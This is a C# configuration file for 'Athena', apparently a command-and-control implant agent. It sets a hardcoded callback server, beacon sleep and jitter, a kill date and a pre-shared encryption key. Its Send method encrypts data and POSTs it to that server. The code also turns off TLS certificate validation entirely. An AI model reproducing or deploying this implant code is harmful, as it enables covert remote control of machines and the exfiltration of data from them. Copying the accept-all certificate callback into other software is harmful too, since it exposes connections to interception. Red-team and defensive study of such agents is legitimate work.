﻿using Athena.Models.Config;
using Athena.Utilities;
using Newtonsoft.Json;
using System.Net;
using System.Net.Security;

namespace Athena
{
    public class Config : IConfig
    {
        public IProfile currentConfig { get; set; }
        public static string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        //public Forwarder forwarder { get; set; }
        public IForwarder forwarder { get; set; }
        public Config()
        {

            uuid = "77db85ec-17c2-4cac-a1c6-cf71c4d7ae52";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = int.TryParse("5", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("5", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.currentConfig = new HTTP();
            //this.forwarder = new Forwarder();
        }
    }
    public class HTTP : IProfile
    {
        public string userAgent { get; set; }
        public string hostHeader { get; set; }
        public string getURL { get; set; }
        public string postURL { get; set; }
        public string psk { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        //Change this to Dictionary or Convert from JSON string?
        public string proxyHost { get; set; }
        public string proxyPass { get; set; }
        public string proxyUser { get; set; }
        public PSKCrypto crypt { get; set; }
        public bool encrypted { get; set; }
        private HttpClient client { get; set; }

        public HTTP()
        {
            HttpClientHandler handler = new HttpClientHandler();
            int callbackPort = Int32.Parse("80");
            string callbackHost = "http://192.168.4.201";
            string getUri = "index";
            string queryPath = "q";
            string postUri = "data";
            this.userAgent = "";
            this.hostHeader = "";
            this.getURL = $"{callbackHost}:{callbackPort}/{getUri}?{queryPath}";
            this.postURL = $"{callbackHost}:{callbackPort}/{postUri}";
            this.proxyHost = ":";
            this.proxyPass = "";
            this.proxyUser = "";
            this.psk = "aNfCcVlUpssws4DBijeKRKtJmlz1wh54AF08XUyS2rE=";

            //Might need to make this configurable
            ServicePointManager.ServerCertificateValidationCallback =
                   new RemoteCertificateValidationCallback(
                        delegate
                        { return true; }
                    );


            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
            {
                WebProxy wp = new WebProxy()
                {
                    Address = new Uri(this.proxyHost)
                };

                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
                {
                    handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
                }
                handler.Proxy = wp;
            }

            this.client = new HttpClient(handler);

            if (!string.IsNullOrEmpty(this.hostHeader))
            {
                this.client.DefaultRequestHeaders.Host = this.hostHeader;
            }

            if (!string.IsNullOrEmpty(this.userAgent))
            {
                this.client.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
            }

            //Doesn't do anything yet
            this.encryptedExchangeCheck = bool.Parse("false");

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(Config.uuid, this.psk);
                this.encrypted = true;
            }

        }
        public async Task<string> Send(object obj)
        {
            try
            {

                string json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = await Misc.Base64Encode(Config.uuid + json);
                }

                var response = await this.client.PostAsync(this.postURL, new StringContent(json));
                json = response.Content.ReadAsStringAsync().Result;

                if (this.encrypted)
                {
                    return this.crypt.Decrypt(json);
                }

                if (!string.IsNullOrEmpty(json))
                {
                    return (await Misc.Base64Decode(json)).Substring(36);
                }

                return String.Empty;
            }
            catch
            {
                return String.Empty;
            }
        }
    }
}